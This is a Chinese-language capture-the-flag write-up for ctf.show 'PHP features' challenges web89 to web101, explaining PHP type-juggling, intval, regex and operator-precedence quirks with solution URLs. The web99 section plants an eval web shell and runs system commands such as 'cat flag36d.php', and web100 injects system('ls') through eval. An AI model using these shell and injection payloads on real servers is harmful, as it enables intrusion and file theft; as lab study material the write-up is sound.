# 🏈 CTFSHOW PHP特性

## <mark style="color:purple;background-color:red;">（1）WEB 89</mark>

### <mark style="color:green;">①代码解释</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 15:38:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
} 
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

代码逻辑很简单，就是我们要让匹配$num的结果是0，然后$num变量通过intval为1就可以了。对于preg\_match匹配要是0，就说明不能是数字，但是如果是字符串的话，在下面的intval匹配中就会为0，这个时候我们要想到如果$num传入一个数组，那么对于pre\_match的特性，就会输出false然后我们就会进入else语句然后num是个数组并且不为空的话，就会输出1，也就是我们的num要通过url解析成一个不为空的数组。

### <mark style="color:green;">②思路介绍</mark>

不知道为什么网上的wp都没有解释一个事情。就是num=\["abc"]和num\[]="abc的区别。（这个地方主要是自己最开始也知道要传一个不含有数字的空的字符串去，但是后面发现其实不对。然后弄了很久才发现原来是url解析的问题。这里将讲解一下url对他们的解析的微妙的区别。）

{% hint style="info" %}
URL解析差异！！！！！！！！！
{% endhint %}

* 对于num\[]=1 ，num被解释为一个数组，其第一个元素为1。这个时候数组的键值是动态生成的索引，例如num\[0]=1\&num\[1]=2。这个时候表达的意思其实是num是个数组，包含一个元素为1的数组。
* 对于num=\["1"]，其实num被解释成为了一个字符串，其值为\["1"].

所以在弄清楚这个后，我们能写出绕过方案

```url
http://65b4d1c3-5cc4-426c-b856-e5c14d755ef0.challenge.ctf.show/?num[]="abc"
```

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>



***

## <mark style="color:purple;background-color:red;">（2）web 90</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:06:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}

```

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

其实这个代码的意思也很明确，就是$num不能完全等于4476，但是在intval函数作用后，要等于4476，就能输出flag。

### <mark style="color:green;">②思路介绍</mark>

其实这一题我们看到intval函数的base为0，就应该想到intval的特性。所以我们可以让num是前面带有字母的，但是开头的数字是4476就行。类似4476ba这种。或者你想麻烦点，把他们进行进制转换也可以。

所以我们的方案就是

```url
http://f855998e-1508-4b60-9956-e03eadde4e40.challenge.ctf.show/?num=4476ab
```

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>



***

## <mark style="color:purple;background-color:red;">（3）web 91</mark>

```php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:16:09
# @link: https://ctfer.com

*/

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}

Notice: Undefined index: cmd in /var/www/html/index.php on line 15
nonononono
```

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

字符串a在开启了多行模式下满足正则表达式/^php$/，但是在非多行模式下，不满足正则表达式了。正则表达式的意思简单翻译就是转化后的字符串是php。

### <mark style="color:green;">②思路解释</mark>

这个就是我们讲过preg\_match含有的特性是绕过多行问题。我们采用的是%0a来解决的。

```url
http://4e1772d9-0414-4f78-a71b-8b49260e5e5e.challenge.ctf.show/?cmd=%0aphp
```

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:red;">（4）web 92</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:29:30
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    } 
```

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

代码的意思就是$num弱类型比较之后的值不能等于4476，并且通过intval函数作用后，在弱类型比较下要等于4476。

### <mark style="color:green;">②思路解释</mark>

我们之前用的直接在后面加字母不能用了，因为在弱类型比较下那样num会被认为是4476。所以我们只能使用intval的进制转换的特性了。我们这里用的是转16进制。（4476的16进制结果是117c）

```url
http://33ebd11e-67ab-47ec-af2f-b2571baba355.challenge.ctf.show/?num=0x117c
```

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>



***

## <mark style="color:purple;background-color:red;">（5）web 93</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:32:58
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

这里比上一题就是添加了一个条件，多了一个num里面不能含有字母。

### <mark style="color:green;">②思路解释</mark>

不能用字母是ban了16进制和二进制，但是8进制，只要开头是0就行了，还是能用的。所以这里我们直接用8进制的写法。4476的八进制结果是10574

```url
http://8e3950a6-590f-4e78-89d3-327e81f2a858.challenge.ctf.show/?num=010574
```

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>



***

## <mark style="color:purple;background-color:red;">（6）web 94</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:46:19
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

这个比上一题又多加了一个条件。为了理解这个条件，我们先了解一下这个函数。

> strpos（）：查找字符串首次出现的位置

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

所以这个条件的意思就是要求我们的第一位不能是0。但是目前我们用进制转换的8进制首位得是0，那么我们就得在前面添加一些不影响我们结果的非0得一些东西。

### <mark style="color:green;">②思路解释</mark>

其实这个从最开始的时候我没有想到，我甚至忘记了intval最基本的功能，就是整型转换，可以把小数转换为整数。

```url
http://6eba394b-d150-47ed-9158-0a9ad1eb8bd7.challenge.ctf.show/?num=4476.0
```

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

后面又看了别人的题解还有就是在8进制的前面用空格或者+，不改变结果。

```url
http://6eba394b-d150-47ed-9158-0a9ad1eb8bd7.challenge.ctf.show/?num= 010574
```

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

```url
http://6eba394b-d150-47ed-9158-0a9ad1eb8bd7.challenge.ctf.show/?num=+010574
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>



***

## <mark style="color:purple;background-color:red;">（7）web 95</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:53:59
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

和上一题不一样的是，他的匹配正则表达式多了个.所以我们的用小数表示就行不通了。但是空格和正号+还是可以用的。可以把这些用url的编码代替也可以。比如%20，%0a,%2b,%09,这种。

### <mark style="color:green;">②思路解释</mark>

加号和空格这个可以把这些用url的编码代替也可以。比如%20，%0a,%2b,%09,这种。

```url
http://aa5282af-22ac-4fd0-af69-6be13ab20eab.challenge.ctf.show/?num=+010574
```

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

其他的写法我们也写在这。

```url
num= 010574
num=%20010574
num=%0a010574
num=%2b010574
num=%09010574
```



***

## <mark style="color:purple;background-color:red;">(8)web 96</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:21:24
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }


}

```

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

我们要查看flag.php文件，但是变量u不能直接为flag.php

### <mark style="color:green;">②思路解释</mark>

我们可以用路径绕过中的知识点，所以我们采取的方案，这里简单一点了，直接就是当前目录下查看算了。

```url
http://0436b3c8-9edb-4ec3-8bf3-bf546aa4699b.challenge.ctf.show/?u=./flag.php
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:red;">（9）web 97</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:36:32
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?> 
```

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

就是我们传入两个变量a和b，并且要求a和b不相等以后，如果a和b的md5在强类型比较下能够相等后，就能输出flag。

### <mark style="color:green;">②思路解释</mark>

很明显这里是强类型比较，并且要不相等，只能两个都传入数组。所以我们的解答是

GET：

```url
http://8c6bea3f-126e-4b07-a12f-b4dc67382625.challenge.ctf.show/
```

POST:

```url
a[]=1&b[]=2
```

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:red;">(10)web98</mark>

```php

Notice: Undefined index: flag in /var/www/html/index.php on line 15

Notice: Undefined index: flag in /var/www/html/index.php on line 16

Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 21:39:27
# @link: https://ctfer.com

*/

include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>

```

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:green;">①代码解释</mark>

这段代码我第一次看的时候还没看懂，甚至被吓到了。但是我们还是秉持着慢慢看的原则。

这里先了解$_COOKIE 和$_SERVER

> $COOKIE
>
> 通过 HTTP Cookies 方式传递给当前脚本的变量的数组。

> $\_SERVER
>
> 服务器和执行环境信息。所以一般server里面的结果应该是一些比如PHP\_SELF这种关键词。

其实当时我没看懂这个&，后来看题解发现他是我们在php语法中提过的引用。所以这段代码的意思就渐渐明了了。

其实我们以没一句的三元运算符？ ：来做隔断，分为三部分来看，每一句的意思其实就变得清晰了。

首先是，如果$_GET获得了元素，就将$POST的值赋值给$_\_GET原来的值，就原来的值被post得到的值覆盖了，否则就让他等于flag。

然后是如果$\_GET得到的变量flag弱类型等于’flag‘，那么我们就用cookie值去覆盖他，否则就是用flag去覆盖他。

第三句同理。

最后一句是高亮文件，get得到的http\_flag变量如果等于flag的话，就输出flag变量，否则就是当前文件。

### <mark style="color:green;">②思路解释</mark>

我们逆向思维一下啊。我们只要知道变量$flag的值就是flag，所以如果要得到flag变量的值，只需要传入get变量http\_flag的值等于flag，就可以。既然我们要传入的是http\_flag,就和第二和第三句没有关系。所以变量用flag来覆盖就是不执行的，所以我们第一句执行的是？后面的部分，就是我们用post得到的结果去覆盖了get得到的变量。所以其实http\_flag等于flag是post方式传进去的参数。但是get又需要有东西传进去，我们就随便传个确定的1=1就行

所以最后得到的就是

GET：

```url
http://6e5b7bbc-dfaf-423b-a558-eb1b0e1807f1.challenge.ctf.show/?2=2
```

POST：

```url
HTTP_FLAG=flag
```

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:red;">（11）web 99</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 22:36:12
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?> 
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

allow变量是个数组，将从1到变量i的数字随机生成一个推入到allow数组里面，然后get传入n，如果传入成功并且n再allow数组里面存在的话，那么就用post方式传入内容写入到n当中。

### <mark style="color:green;">②思路解释</mark>

其实从file\_put\_contents函数，我们知道n传入的是个文件，post传入的是文件内容。所以n应该是个php文件，post传入一个getshell。然后又因为n要在allow数组里面，并且allow是1到i当中的数字。因为每一次都是从1到某个数字，所以1的概率还是很大的，我们就取n为1.php。至于判断是否在数组当中。我们之前其实在将php特性知识点的时候提到过，与数组中的元素比较的时候，会发生强制转换。所以1.php会变成1.

所以最后的结果是

GET

```url
http://efcbe0f7-b5f2-46d4-88c7-f7f588b31085.challenge.ctf.show/?n=1.php
```

POST

```url
content=<?php @eval($_POST['x'])?>
```

然后我们再进入1.php文件里面，输入我们的shell，我们这里是查看当前文件。

GET：

```url
http://efcbe0f7-b5f2-46d4-88c7-f7f588b31085.challenge.ctf.show/1.php
```

POST

```url
x=system("ls");
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

然后我们再将post代码修改为查看flag36d.php文件的代码。然后查看源码得到flag。

POST：

```url
x=system("cat flag36d.php");
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:red;">（12）WEB 100</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-21 22:10:28
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}


?>

Notice: Undefined index: v1 in /var/www/html/index.php on line 17

Notice: Undefined index: v2 in /var/www/html/index.php on line 18

Notice: Undefined index: v3 in /var/www/html/index.php on line 19
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

创建了一个ctfshow的类,然后用get的方式传入v1，v2，v3。接下来这个要用到运算符的优先级（开始的时候我并不知道=的优先级高于and。），因为= > and，所以is\_numeric($v1)的结果赋值给$v0。并且如果v0为1，之后v2不能有分号，v3要有分号。然后执行一个拼接的执行代码。

### <mark style="color:green;">②思路解释</mark>

因为v0一定要是1，所以v1一定要是数字。v2不能含有分号，但是v2后面是要指令，v3得是分号。所以我们的方案是

```url
http://4eb5f1fe-a9fd-4f35-ab83-1e6102816cd2.challenge.ctf.show/?v1=1&v2=system("ls")&v3=;
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```url
http://4eb5f1fe-a9fd-4f35-ab83-1e6102816cd2.challenge.ctf.show/?v1=1&v2=system("tac ct*")&v3=;
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

把得到的flag is后面的字符串里面的0x2d换成-就是flag。

***

## <mark style="color:purple;background-color:red;">（13）web 101</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-22 00:26:48
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

?>

Notice: Undefined index: v1 in /var/www/html/index.php on line 17

Notice: Undefined index: v2 in /var/www/html/index.php on line 18

Notice: Undefined index: v3 in /var/www/html/index.php on line 19
```

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

























